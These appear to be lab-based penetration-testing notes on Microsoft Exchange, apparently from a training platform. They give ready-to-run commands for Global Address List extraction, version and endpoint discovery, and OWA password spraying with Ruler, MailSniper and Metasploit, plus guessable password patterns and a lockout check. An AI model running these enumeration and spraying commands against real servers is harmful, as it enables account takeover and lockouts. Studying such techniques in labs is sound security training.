## What is?
We all know what is a Exchange Server, it's the Microsoft implementation of a Email server that is free and widely used all around the world.
## Good to know...
There are 2 links that are good to know when we are talking about Exchange servers:
```
//Web Mail
https://mail.server/owa

//Exchange Management Portal
https://mail.server/ecp
```
In both cases you can login either with the traditional username as **DOMAIN/username** or username@domain.something.

# Enumeration
## Extract emails from GAL
If you want to extract all the emails available from the **GAL(Global Address Lists)** you can use this Python based script to do so. 
https://raw.githubusercontent.com/pigeonburger/global-address-list-owa/main/emailextract.py
<font color="#ff0000">Remember to adjust the script to match the right URL and when done run it with some valid credentials. And remove the ssl verify in case of using self signed certs.</font>
```shell-session
python3 emailextract.py -i exch01.inlanefreight.local -u htb-student@inlanefreight.local -p 'HTB_@cademy_stdnt!'
```
From Windows you can either use this Powershell Script.
https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1
```powershell-session
Get-GlobalAddressList -ExchHostname exch01.inlanefreight.local -Username htb-student -Password 'HTB_@cademy_stdnt!' -OutFile globaladdresslist.txt
```

## Getting the Back-end Version
This can be accomplished easily with a curl request to the ECP endpoint.
```shell-session
curl https://10.129.230.37/ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application -k | xmllint --format - | grep version  
```

## Getting all the endpoints
It is possible to get the URL of all the endpoints available on a Exchange server back-end like *owa*,*ecp* and many more.
```shell-session
git clone https://github.com/nyxgeek/ntlmscan
```
Now we can use the cloned repository to perform a scan discovery of the services.
```shell-session
python3 ntlmscan.py  --host https://10.129.231.81
[-] Testing path https://10.129.231.81/
[-] Testing path https://10.129.231.81/
[+] FOUND NTLM - https://10.129.231.81/autodiscover/
[+] FOUND NTLM - https://10.129.231.81/ews/
[+] FOUND NTLM - https://10.129.231.81/rpc/
[+] FOUND NTLM - https://10.129.231.81/oab/
```
And consequently scan the services via NMAP.
```shell-session
sudo nmap -sV --script http-ntlm-info --script-args http-ntlm-info.root=/ews/ -p443 10.129.231.81
```

# Attacks
## Pass Spray
If you managed to gain a valid list of emails, ex. from a GAL you can try to perform a password spray attack with some common passwords like `companyName<YEAR>!` or `seasons<YEAR>!` and other variations. <font color="#ff0000">Be aware that this might block accounts based on how is the domain policy setup in AD.</font>
In Linux you can use the custom tool named [Ruler](https://github.com/sensepost/ruler).
```shell-session
./ruler-linux64 --domain inlanefreight.local -k brute --users users.txt --passwords passwords.txt --verbose -a 4 
```
You can also use Metasploit's plugin(`scanner/HTTP/owa_login`) which I found to be more consistent!
Same can be performed directly via a Windows session with the Powershell script named [mailsniper.ps1](https://raw.githubusercontent.com/dafthack/MailSniper/master/MailSniper.ps1).
```powershell-session
Invoke-PasswordSprayOWA -ExchHostname exch01.inlanefreight.local -UserList .\usernames.txt -Password
 "Inlanefreight2024!" -OutFile creds.txt
```
**OBS:** remember to check if the *LockoutBadCount* status **0=disabled**.
```powershell-session
(Get-DomainPolicy)."SystemAccess"

MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
MinimumPasswordLength        : 7
PasswordComplexity           : 1
PasswordHistorySize          : 24
LockoutBadCount              : 0
```